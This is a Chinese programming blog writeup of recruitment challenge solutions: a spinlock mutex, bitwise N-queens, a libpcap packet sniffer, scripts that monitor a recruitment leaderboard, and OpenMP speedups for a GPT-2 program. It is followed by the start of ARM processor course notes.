1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdatomic.h&gt;#include &lt;sched.h&gt;typedef struct { atomic_int lock_flag;} my_mutex_t;void my_mutex_init(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);}void my_mutex_lock(my_mutex_t *mutex) { while (atomic_exchange(&amp;mutex-&gt;lock_flag, 1) == 1) { sched_yield(); }}void my_mutex_unlock(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);}int work_load;my_mutex_t my_mutex;void *worker(void *counter_ptr) { for (int i = 0; i &lt; work_load; i++) { my_mutex_lock(&amp;my_mutex); (*(int *)counter_ptr) += 1; my_mutex_unlock(&amp;my_mutex); } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter = 0; my_mutex_init(&amp;my_mutex); pthread_create(&amp;thread1, NULL, worker, &amp;counter); pthread_create(&amp;thread2, NULL, worker, &amp;counter); pthread_join(thread1, NULL); pthread_join(thread2, NULL); printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} 📟BitterCH112345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define BOARD_SIZE 8int upper_lim = 1;int count = 0;/** int row: store the valid bit after applying the vertical rule* int ld: store the valid bit after applying the left diagram rule* int rd: store the valid bit after applying the right diagram rule* bit '0' represent where we can place a chess*/void solve_problem(int row ,int ld, int rd) { if( row == upper_lim) { count += 1; return ; } /* 'current' represent all the valid bit*/ int current = upper_lim &amp; (~ (row | ld | rd)); int buffer = current; while(buffer) { int valid = buffer &amp; (-buffer); buffer -= valid; solve_problem(row|valid, (ld|valid)&lt;&lt;1, (rd|valid)&gt;&gt;1); /////////////////////////////////////// }}/* board_size shouldn't be too large */void find_n_th_queen(int board_size ) { upper_lim = (1 &lt;&lt; board_size) - 1; solve_problem(0, 0, 0);}int main() { find_n_th_queen(BOARD_SIZE); printf(&quot;Answer: %d&quot;, count);}// Answer: 92 CH2用位来标记数组元素的状态。 1234567891011121314151617181920212223242526def solve(nums): n = len(nums) states = 1 &lt;&lt; n max_sum = 0 for state in range(states): valid = True curr_sum = 0 for i in range(n): if state &amp; (1 &lt;&lt; i): #choose ith element curr_sum += nums[i] if i &gt; 0 and (state &amp; (1 &lt;&lt; (i - 1))): #conflict valid = False break if valid: max_sum = max(max_sum, curr_sum) return max_sumnums = [1, 15, 3, 7, 12, 10, 19, 8, 5, 17, 2, 6, 11, 9, 4, 14, 13, 18, 16, 20]print(solve(nums))'''130[Done] exited with code=0 in 0.965 seconds''' 动态规划可以显著降低时间。 加密算法：AES中存在行移位，哈希算法会使用位移、异或操作，提供安全性 快速运算：位移操作快速计算，奇偶判断，节约时间，bitset筛素数可节省空间 文件权限：使用位运算可以方便地开启或关闭某些标志位 并行计算：位运算可以快速地启用或禁用某个线程或者检查某个线程的状态 🎩顺手牵羊要求：使用C语言实现一个自己的抓包软件 使用libpcap库实现抓包。 程序应该实现：判断并输出每个包的类型，包的长度，以及包的源地址和目的地址。 如果你能实现对于TCP包的捕获，可以获得70%的分数。如果你能实现至少三种包的分析捕获，可以获得剩下30%的分数。 简单阐述下你对抓包的实现原理的理解，最高可得额外的20%分数。 hint：要不下载一个wireshark体验下抓包？ 题解： 在C语言中使用libpcap库来进行抓包操作。 安装libpcap库； 1sudo apt install libpcap-dev 实现对TCP包的捕获； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;pcap.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt; //提供了IP地址的转换函数#include &lt;netinet/ip.h&gt;#include &lt;netinet/tcp.h&gt; //定义了IP和TCP头部的结构体// 回调函数在每次捕获到数据包时被调用void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) { struct ip *ip_header = (struct ip *)(packet + 14); //跳过以太网帧头(14)、获取ip头 struct tcphdr *tcp_header = (struct tcphdr *)(packet + 14 + ip_header-&gt;ip_hl * 4); //获取TCP头 printf(&quot;&lt;--------- New Packet Arrived! ---------&gt;\\n&quot;); printf(&quot;Total packet available: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;Expected packet size: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;IP header length (IHL) in bytes: %d\\n&quot;, ip_header-&gt;ip_hl * 4); printf(&quot;Source Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_src)); printf(&quot;Destination Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_dst)); printf(&quot;TCP header length in bytes: %d\\n&quot;, tcp_header-&gt;th_off * 4); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header-&gt;ip_hl * 4 + tcp_header-&gt;th_off * 4); printf(&quot;Payload size: %d bytes\\n&quot;, pkthdr-&gt;len - (ip_header-&gt;ip_hl * 4 + tcp_header-&gt;th_off * 4)); printf(&quot;---------------------------------------\\n&quot;);} //三个参数分别表示：用户传递的数据、数据包头部信息、指向实际的数据包内容int main() { char errbuf[PCAP_ERRBUF_SIZE]; pcap_if_t *alldevs; pcap_if_t *device; pcap_t *handle; // 调用函数获取所有可用设备列表 if (pcap_findalldevs(&amp;alldevs, errbuf) == -1) { fprintf(stderr, &quot;Error finding devices: %s\\n&quot;, errbuf); return 1; } // 选择第一个设备 device = alldevs; printf(&quot;Using device: %s\\n&quot;, device-&gt;name); // 打开设备 handle = pcap_open_live(device-&gt;name, BUFSIZ, 1, 1000, errbuf); pcap_loop(handle, 0, packet_handler, NULL); //捕获数据包，回调 pcap_freealldevs(alldevs); pcap_close(handle); return 0;} 编译运行上述代码，打开firefox，捕获到数据包： 1234567891011121314$ gcc -o packet_sniffer packet_sniffer -lpcap$ sudo ./packet_snifferUsing device: loopback0&lt;--------- New Packet Arrived! ---------&gt;Total packet available: 1514 bytesExpected packet size: 1514 bytesIP header length (IHL) in bytes: 20Source Address: 127.0.0.1Destination Address: 127.0.0.1TCP header length in bytes: 32Size of all headers combined: 52 bytesPayload size: 1462 bytes---------------------------------------...... 这些数据包是在 WSL 2 内部通过 loopback 接口进行的本地通信，源头和目的地都是127.0.0.1。查找网络接口： 12345678910$ ip addr...4: loopback0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:15:5d:78:40:b2 brd ff:ff:ff:ff:ff:ff5: eth2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether e0:2e:0b:08:09:53 brd ff:ff:ff:ff:ff:ff inet 192.168.0.144/24 brd 192.168.0.255 scope global noprefixroute eth2 valid_lft forever preferred_lft forever inet6 fe80::66a7:f661:86e5:c634/64 scope link nodad noprefixroute valid_lft forever preferred_lft forever 发现eth2是当前唯一状态为 UP 且配置了 IP 地址的接口，是WSL主要用于与外部网络通信的接口。修改代码： 1234567891011121314151617int main() { ... // 查找名为 &quot;eth2&quot; 的设备 for (device = alldevs; device != NULL; device = device-&gt;next) { if (strcmp(device-&gt;name, &quot;eth2&quot;) == 0) { found = 1; break; } } if (!found) { printf(&quot;Device eth2 not found. Make sure you have the necessary permissions.\\n&quot;); pcap_freealldevs(alldevs); return 1; } ...} 编译运行结果如下： 1234567891011&lt;--------- New Packet Arrived! ---------&gt;Total packet available: 66 bytesExpected packet size: 66 bytesIP header length (IHL) in bytes: 20Source Address: 192.168.0.144Destination Address: 34.107.243.93TCP header length in bytes: 32Size of all headers combined: 52 bytesPayload size: 14 bytes---------------------------------------... 实现对TCP、UDP和ICMP三种包的捕获： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &lt;pcap.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;netinet/ip.h&gt;#include &lt;netinet/tcp.h&gt;#include &lt;netinet/udp.h&gt;#include &lt;netinet/ip_icmp.h&gt;// 回调函数，用于处理捕获的数据包void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) { struct ip *ip_header = (struct ip *)(packet + 14); // 跳过以太网头部（Ethernet header） int ip_header_length = ip_header-&gt;ip_hl * 4; printf(&quot;&lt;--------- New Packet Arrived! ---------&gt;\\n&quot;); printf(&quot;Total packet available: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;Expected packet size: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;IP header length (IHL) in bytes: %d\\n&quot;, ip_header_length); printf(&quot;Source Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_src)); printf(&quot;Destination Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_dst)); // 检查IP包的协议字段以确定其类型 switch (ip_header-&gt;ip_p) { case IPPROTO_TCP: { struct tcphdr *tcp_header = (struct tcphdr *)(packet + 14 + ip_header_length); int tcp_header_length = tcp_header-&gt;th_off * 4; printf(&quot;Protocol: TCP\\n&quot;); printf(&quot;TCP header length in bytes: %d\\n&quot;, tcp_header_length); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header_length + tcp_header_length); printf(&quot;Payload size: %d bytes\\n&quot;, pkthdr-&gt;len - (ip_header_length + tcp_header_length)); break; } case IPPROTO_UDP: { struct udphdr *udp_header = (struct udphdr *)(packet + 14 + ip_header_length); int udp_header_length = 8; // UDP header 固定长度为 8 字节 printf(&quot;Protocol: UDP\\n&quot;); printf(&quot;UDP header length in bytes: %d\\n&quot;, udp_header_length); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header_length + udp_header_length); printf(&quot;Payload size: %d bytes\\n&quot;, ntohs(udp_header-&gt;len) - udp_header_length); break; } case IPPROTO_ICMP: { struct icmphdr *icmp_header = (struct icmphdr *)(packet + 14 + ip_header_length); int icmp_header_length = 8; // ICMP header 通常为 8 字节 printf(&quot;Protocol: ICMP\\n&quot;); printf(&quot;ICMP header length in bytes: %d\\n&quot;, icmp_header_length); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header_length + icmp_header_length); printf(&quot;Payload size: %d bytes\\n&quot;, pkthdr-&gt;len - (ip_header_length + icmp_header_length)); break; } default: printf(&quot;Protocol: Other\\n&quot;); break; } printf(&quot;---------------------------------------\\n&quot;);}int main() { char errbuf[PCAP_ERRBUF_SIZE]; pcap_if_t *alldevs; pcap_if_t *device; pcap_t *handle; int found = 0; // 使用 pcap_findalldevs 来获取所有可用设备 if (pcap_findalldevs(&amp;alldevs, errbuf) == -1) { fprintf(stderr, &quot;Error finding devices: %s\\n&quot;, errbuf); return 1; } // 查找名为 &quot;eth2&quot; 的设备 for (device = alldevs; device != NULL; device = device-&gt;next) { if (strcmp(device-&gt;name, &quot;eth2&quot;) == 0) { found = 1; break; } } if (!found) { printf(&quot;Device eth2 not found. Make sure you have the necessary permissions.\\n&quot;); pcap_freealldevs(alldevs); return 1; } printf(&quot;Using device: %s\\n&quot;, device-&gt;name); // 打开设备 handle = pcap_open_live(device-&gt;name, BUFSIZ, 1, 1000, errbuf); if (handle == NULL) { printf(&quot;Could not open device %s: %s\\n&quot;, device-&gt;name, errbuf); pcap_freealldevs(alldevs); return 1; } // 开始捕获数据包 pcap_loop(handle, 0, packet_handler, NULL); // 释放设备列表 pcap_freealldevs(alldevs); pcap_close(handle); return 0;} 运行代码抓包： 123456789101112&lt;--------- New Packet Arrived! ---------&gt;Total packet available: 90 bytesExpected packet size: 90 bytesIP header length (IHL) in bytes: 20Source Address: 185.125.190.57Destination Address: 192.168.0.144Protocol: UDPUDP header length in bytes: 8Size of all headers combined: 28 bytesPayload size: 48 bytes---------------------------------------... 首先找到可用的网络接口，确保抓包工具监听到指定网络接口上的所有数据包；打开网络接口，置于混杂模式（1），以便捕获所有经过该接口的数据包；循环捕获包，调用回调函数，解析IP包头的字段，判断包所使用的传输层协议等等。 libpcap通过操作系统的网络驱动从链路层捕获数据包，将其暂存在内核缓冲区中，然后将数据包传递到用户空间供应用程序分析。 参考内容： C语言如何做抓包 👿busin的野心要求：请你写个程序，自动检测排行榜的变化。具体有如下两个需求： 招新网站的排行榜包含10个招新相关方向以及一个总分方向。如果这11个类别中的任意一个排行的前十名发生了变化，程序就会打印：1.新的前十名排行 2.哪一个人掉出了前十名 3.哪一个人进入了前十名。 程序应该监测特定的题目（使用动态容器的题目可以不被监测）。当有人通过了这个题目后，程序会按照f&quot;passer: {user_name}, task: {task_name}, time: {passing_time}&quot;打印出这条信息。 将程序部署在服务器上实现24h运行，并能通过社交软件/邮箱/其他能从移动设备上接收到更新信息的方式，将信息发送到你的移动设备上，实现可视化的管理界面。 (ps:这可能需要一点SA的知识） 题解：首先编写程序rank.py实现打印排名变化情况。 在https://recruit.cnss.io/#/rank上，刷新页面在浏览器控制台网络中找到了fullrank，其通过XHR获取数据，说明排行榜的数据可能是通过该请求动态加载的。于是我们模拟浏览器的请求，**由于Token在随着时间变化，于是添加手动输入Token的部分：** 12345678910111213141516171819202122232425262728293031323334import requestsimport jsondef fetch(url, token): headers = { &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;recruit.cnss.io:8443&quot;, &quot;Origin&quot;: &quot;https://recruit.cnss.io&quot;, &quot;Referer&quot;: &quot;https://recruit.cnss.io/&quot;, &quot;Sec-CH-UA&quot;: '&quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;', &quot;Sec-CH-UA-Mobile&quot;: &quot;?0&quot;, &quot;Sec-CH-UA-Platform&quot;: '&quot;Windows&quot;', &quot;Sec-Fetch-Dest&quot;: &quot;empty&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-site&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&quot;, &quot;Token&quot;: token } try: response = requests.get(url, headers=headers) if response.status_code == 200: return response.json() else: print(f&quot;Failed to fetch rankings. HTTP Status Code: {response.status_code}&quot;) print(f&quot;Response content: {response.text}&quot;) return None except requests.exceptions.RequestException as e: print(f&quot;Error fetching rankings: {e}&quot;) return None 主函数流程，记录old_rankings.json文件，fetch得到new_rankings，对新旧排行进行比较，打印信息，更新old_rankings。 12345678910111213141516171819202122232425def main(): url = &quot;https://recruit.cnss.io:8443/v1/fullrank&quot; token = input(&quot;Please enter your access token: &quot;).strip() if not token: print(&quot;Your Token cannot be NULL.&quot;) return try: with open(&quot;old_rankings.json&quot;, &quot;r&quot;) as file: old_rankings = json.load(file) except FileNotFoundError: old_rankings = {} new_rankings = fetch(url, token) if new_rankings: changes = compare(old_rankings, new_rankings) print_changes(changes) with open(&quot;old_rankings.json&quot;, &quot;w&quot;, encoding='utf-8') as file: json.dump(new_rankings, file, ensure_ascii=False, indent=4)if __name__ == &quot;__main__&quot;: main() 下面是compare和print函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849def compare(old_rankings, new_rankings): changes = {} for direction, new_top10 in new_rankings.items(): old_top10 = old_rankings.get(direction, []) old_top10_users = [item['Name'] for item in old_top10[:10] if 'Name' in item] new_top10_users = [item['Name'] for item in new_top10[:10] if 'Name' in item] entered = set(new_top10_users) - set(old_top10_users) dropped = set(old_top10_users) - set(new_top10_users) order_changed = old_top10_users != new_top10_users #judge if entered or dropped or order_changed: changes[direction] = { 'new_top10': [{'Name': item['Name'], 'Score': item['Score']} for item in new_top10[:10] if 'Name' in item], 'entered': list(entered), 'dropped': list(dropped), 'order_changed': order_changed } return changesdef print_changes(changes): if not changes: print(&quot;排名未发生变化。&quot;) return for direction, details in changes.items(): print(f&quot;\\n方向: {direction}&quot;) print(&quot;新的前十名排行:&quot;) for rank, user in enumerate(details['new_top10'], start=1): print(f&quot; 名次 {rank}: {user['Name']} (得分: {user['Score']})&quot;) if details['entered']: print(f&quot;进入前十名的人: {', '.join(details['entered'])}&quot;) else: print(&quot;没有新进入前十名的人。&quot;) if details['dropped']: print(f&quot;掉出前十名的人: {', '.join(details['dropped'])}&quot;) else: print(&quot;没有掉出前十名的人。&quot;) if details['order_changed']: print(&quot;前十名内部顺序发生了变化。&quot;) 运行一下，得到输出。 接下来我们编写task.py程序。以一道题为例，我的思路是先在题目tasks那个页面，捕获特定题目的pass_number，当通过人数发生变化时，遍历用户，在passrecord寻找该题的通过者，异步化代码实现如下 Python异步网络编程利器——详解aiohttp的使用教程 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import aiohttpimport asyncioimport jsonfrom datetime import datetimeTASK_URL = &quot;https://recruit.cnss.io:8443/v1/tasks/534&quot;PASSRECORD_URL_TEMPLATE = &quot;https://recruit.cnss.io:8443/v1/passrecord/{}&quot;TARGET_TASK_TITLE = &quot;👿busin的野心&quot;USER_ID_RANGE = range(530, 535)SLEEP_INTERVAL = 6previous_pass_number = Noneuser_submissions = {}token = &quot;&quot;async def fetch_pass_number(session): headers = { &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;recruit.cnss.io:8443&quot;, &quot;Origin&quot;: &quot;https://recruit.cnss.io&quot;, &quot;Referer&quot;: &quot;https://recruit.cnss.io/&quot;, &quot;Sec-CH-UA&quot;: '&quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;', &quot;Sec-CH-UA-Mobile&quot;: &quot;?0&quot;, &quot;Sec-CH-UA-Platform&quot;: '&quot;Windows&quot;', &quot;Sec-Fetch-Dest&quot;: &quot;empty&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-site&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&quot;, &quot;Token&quot;: token } try: async with session.get(TASK_URL, headers=headers) as response: response.raise_for_status() data = await response.json() tasks = data.get('dev', []) for task in tasks: if task.get('title') == TARGET_TASK_TITLE: return task.get('pass_number') except aiohttp.ClientError as e: print(f&quot;获取任务数据时发生异常: {e}&quot;) except Exception as e: print(f&quot;处理任务数据时发生异常: {e}&quot;) return Noneasync def fetch_user_submission(session, user_id): headers = { &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;recruit.cnss.io:8443&quot;, &quot;Origin&quot;: &quot;https://recruit.cnss.io&quot;, &quot;Referer&quot;: &quot;https://recruit.cnss.io/&quot;, &quot;Sec-CH-UA&quot;: '&quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;', &quot;Sec-CH-UA-Mobile&quot;: &quot;?0&quot;, &quot;Sec-CH-UA-Platform&quot;: '&quot;Windows&quot;', &quot;Sec-Fetch-Dest&quot;: &quot;empty&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-site&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&quot;, &quot;Token&quot;: token } url = PASSRECORD_URL_TEMPLATE.format(user_id) try: async with session.get(url, headers=headers) as response: response.raise_for_status() return await response.json() except aiohttp.ClientError as e: print(f&quot;获取用户 {user_id} 的数据时出错: {e}&quot;) except Exception as e: print(f&quot;处理用户 {user_id} 的数据时出错: {e}&quot;) return None 整个函数的逻辑是这样的：通过fetch初始化每个用户（这里是530到535）的提交内容，记录下来，然后每6秒去监测特定题目的通过人数有没有发生变化，一旦发生变化，调用check函数遍历比对，打印出信息。 12345678910111213141516171819async def main(): global token token = input(&quot;请输入Token: &quot;).strip() if not token: print(&quot;Token不能为空。&quot;) return user_ids = USER_ID_RANGE async with aiohttp.ClientSession() as session: await initialize_user_records(session, user_ids) while True: await monitor_pass_number(session, user_ids) await asyncio.sleep(SLEEP_INTERVAL)if __name__ == &quot;__main__&quot;: try: asyncio.run(main()) except KeyboardInterrupt: print(&quot;\\n程序已手动终止。&quot;) 下面我们完善遍历用户，进行初始化用户的提交内容： 12345678910async def initialize_user_records(session, user_ids): global user_submissions tasks = [fetch_user_submission(session, user_id) for user_id in user_ids] submissions = await asyncio.gather(*tasks) for user_id, submission in zip(user_ids, submissions): if submission is not None: user_submissions[user_id] = submission print(f&quot;初始记录已保存用户 {user_id}。&quot;) else: print(f&quot;未能获取用户 {user_id} 的初始记录。&quot;) 接着监测特定题目人数并在变化时遍历： 123456789101112131415161718192021222324252627282930313233343536373839404142async def monitor_pass_number(session, user_ids): global previous_pass_number current_pass_number = await fetch_pass_number(session) if current_pass_number is not None: if previous_pass_number is None: previous_pass_number = current_pass_number print(f&quot;初始 pass_number: {current_pass_number}&quot;) elif current_pass_number &gt; previous_pass_number: print(f&quot;pass_number 增加了！新的 pass_number: {current_pass_number}&quot;) await check_user_submission_changes(session, user_ids) previous_pass_number = current_pass_number else: print(f&quot;当前 pass_number: {current_pass_number}&quot;) else: print(&quot;无法获取 pass_number&quot;)async def check_user_submission_changes(session, user_ids): global user_submissions tasks = [fetch_user_submission(session, user_id) for user_id in user_ids] submissions = await asyncio.gather(*tasks) for user_id, new_submission in zip(user_ids, submissions): if new_submission is None: continue previous_submission = user_submissions.get(user_id, []) new_tasks = {task['TaskID']: task for task in new_submission} old_tasks = {task['TaskID']: task for task in previous_submission} for task_id, new_task in new_tasks.items(): old_task = old_tasks.get(task_id) if not old_task or old_task.get('Score') != new_task.get('Score'): if new_task.get('TaskTitle') == TARGET_TASK_TITLE: user_name = f&quot;User {user_id}&quot; task_name = new_task.get('TaskTitle') passing_time = datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;) print(f&quot;passer: {user_name}, task: {task_name}, time: {passing_time}&quot;) user_submissions[user_id] = new_submission 运行上述代码，得到输出结果。速度有明显提升。 🤖GPT2目标：你可能已经发现了，你的程序可能并没有我演示的跑的那么快（神机请忽略）。 你的目标就是优化该程序的性能，在保证结果不变的情况下更快的完成文本的补全。 我会使用一些测试点来评测你的程序的正确性和执行时间。期待更高的效率和更多样的优化方案。 此外，请在 wp 中回答下面的问题： 什么是阿姆达尔定律？根据阿姆达尔定律，我们应该把优化的重点放在哪里？ 你的优化方案和思路是什么？优化的效果受到哪些因素影响？ 题解：按照指示完成GPT2，make运行一下，发现需要20多秒。 阿姆达尔定律是一个经验法则，代表处理器并行运算之后效率提升的能力。在并行计算中，使用多个处理器的程序的加速比受限制于程序串行部分的执行时间。$$s(n)=\\frac{1}{B+(1-B)/n}$$ $s(n):$ 固定负载下，理论上的加速比 $B:$ 串行工作部分所占比例，取值0~1 $n:$ 并行线程数，并行处理节点个数 可以看出，即使我们增加处理器数量，只能对并行部分产生影响，而对非并行部分没有任何影响。因此随着处理器数量增加，整体性能的提升会趋于平缓。 根据阿姆达尔定律，应该将优化重点放在最小化串行部分，同时最大化可并行部分。 浏览源gpt.c代码中注意到，存在矩阵乘法、注意力机制和涉及大量计算的循环，可以进行并行计算，将任务分配到多个处理器上，使用OpenMP并行化矩阵乘法、前馈神经网络层等。 具体操作是在matmul_forward和attention_forward函数循环前添加代码： 12#include &lt;omp.h&gt;#pragma omp parallel for collapse(2) 同时，在MakeFile中开启编译选项-fopenmp。 12345release: cc gpt.c -lm -O3 -fopenmp -Wno-unused-result -Wno-unused-value -Wno-unused-variable -o gptdebug: cc gpt.c -lm -O1 -g -fopenmp -Wno-unused-result -Wno-unused-value -Wno-unused-variable -o gpt 前后对比一下 在保证结果不变的情况下更快的（5~6秒)完成了文本的补全。 优化效果受影响的因素： 串行部分：总加速比会受到制约 硬件资源：可用处理器的数量和硬件的性能 编译器的优化程度 并行化的开销。","link":"/2024/11/30/CNSS%20Recruit%20Dev%202024/"},{"title":"「UESTC II」Advanced RISC Machine","text":"本文是我在准备信软学院⚙️ARM处理器体系结构及其应用这门课考试的时候写下的笔记，同时也记录了这门课的实验任务。 课程目标： CO1：让学生掌握嵌入式系统的基础知识，嵌入式处理器系列，嵌入式系统开发环境，嵌入式操作系统等，培养学生专业知识能力。 CO2：让学生掌握ARM9处理器内核，ARM处理器工作状态，ARM处理器运行模式，ARM寄存器，ARM存储系统，ARM的异常等，培养学生底层硬件的能力。 CO3：让学生掌握ARM寻址方式和指令系统，ARM的伪指令，ARM的简单编程和ARM的综合编程，培养学生底层综合编程能力。 CO4：让学生掌握S3C2440嵌入式处理器，掌握S3C2440处理器的外设及应用。培养学生解决复杂系统的能力，如简单的硬件设计，以及基于软硬件的综合设计、编程能力。（不考） 考核方式： 平时成绩（40%）+期末考试（60%） 平时成绩：15%期中随堂测验 + 25%作业 + 60%实验 总评成绩（100）= 期中（6）+ 作业（10）+ 实验（24）+ 期末（60） Topics Covered： 嵌入式系统 ARM 处理器系统结构 ARM 指令集 ARM 伪指令及编程 嵌入式系统基础作业题： 一、什么是嵌入式系统？ 通常的定义：嵌入式系统是以应用为中心，以计算机技术为基础，采用可剪裁软硬件，适用于对功能、可靠性、成本、体积、功耗等有严格要求的专用计算机系统。 通俗的定义：嵌入到对象体系中的专用计算机系统。 嵌入性、专用性与计算机系统是嵌入式系统的三个基本要素。 二、嵌入式微处理器的体系结构有哪两种？简单两种体系结构各自的特点。 嵌入式微处理器的体系结构有冯.诺依曼结构和哈佛结构两种。 冯.诺依曼结构也称为普林斯顿结构，是一种将程序指令存储器和数据存储器合并在一起的存储器结构。单次取指令长度和取数据的长度相同。 哈佛结构：是一种将 程序指令存储和数据存储分开的存储器结构。程序指令存储和数据存储分开，单次取指令长度和取数据的长度可以不相同。 三、简单描述嵌入式实时操作系统中的任务的四个状态。 实时操作系统中的任务有四个状态：运行、就绪、挂起、冬眠。 运行：获得 CPU 的控制权。 就绪：进入任务等待队列，等待通过调度转为运行状态。 挂起：任务发生阻塞，移出任务就绪队列，等待系统实时事件的发生而唤醒，从而转为 就绪 或 运行。 冬眠：任务完成 或 错误 等原因被清除的任务，也可以认为是系统中不存在的任务。 四、简述精简指令集 RISC 和复杂指令集 CISC 的主要区别 以下关于 RISC 和 CISC 说法正确的是( A、C ) A、RISC 一个周期执行一条指令 B、RISC 相对于 CISC，其指令集实现的功能更多 × C、RISC 相对于 CISC 具有更多的寄存器 D、RISC 能直接处理存储器中的数据 嵌入式系统的三个基本要素是（ A、B、C ） A：嵌入性 B：专用性 C：计算机系统 D：通用性 在以下分类中，属于按实时性划分的是( B、D )。 A、8 位嵌入式系统。 B、硬实时系统。 C、前后台系统 D、软实时系统 属于硬件调试工具是（ A、C、D ）。 A、实时在线仿真器 B、电路开发板 C、逻辑分析仪 D、ROM 仿真器 在下列嵌入式处理器类型中，集成度最高的是( D )。 A、嵌入式微处理器 B、嵌入式微控制器 C、嵌入式 DSP 处理器 D、SOC 片上系统 实时操作系统中的任务的就绪状态是指( B )。 A、获得 CPU 的控制权。 B、进入任务等待队列，等待通过调度转为运行状态。 C、任务发生阻塞，移出任务就绪队列。 D、任务完成或错误 等原因被清除的任务。 ARM 处理器及系统结构ARM 处理器简介ARM 处理器系列ARM9 处理器内核以上 PPT。 *ARM 处理器工作状态嵌入式系统在某些应用场合对存储成本或空间要求比较苛刻，为了让用户更好地控制代码量，于是设计了2套指令系统，分别为ARM指令集和Thumb指令集。其中ARM指令集为32位（字）长度，具有最完整的功能；Thumb指令集为16位（半字）长度，能实现ARM指令集的大部分功能。在功能上可以认为Thumb是ARM指令集的子集。 ARM微处理器中支持字节（8位）、半字（16位）、字（32位）三种数据类型。 *ARM 处理器运行模式ARM体系结构支持 7种 运行模式。（PPT 66 页） 除用户模式外的其它6种处理器模式称为特权模式（Privileged Modes）。在特权模式下，程序可以访问所有的系统资源，也可以任意的进行处理器模式切换。只有在特权模式下才允许对当前程序状态寄存器（CPSR）的所有控制位直接进行读/写访问，而在非特权模式下只允许对CPSR的控制位进行间接访问（SWI方式）。 *ARM 寄存器ARM处理器有如下37个用户可见寄存器。（PPT 72 页）31个通用寄存器以及6个状态寄存器。 ARM 处理器共有 7 种运行模式，在每一种处理器模式中都有一组相应的寄存器。 在ARM状态下，任一时刻都可以访问到 16个通用寄存器和1~2个状态寄存器。 这些条件标志位会根据程序中的算数指令或逻辑指令的执行结果进行改变，而且这些条件标志位可由大多数指令检测以决定指令是否执行。 （1）N 本位设置成当前指令执行结果的第31位。当两个由补码表示的有符号整数运算时，N=1 表示结果为负数；否则结果为正数或零。 （2）Z 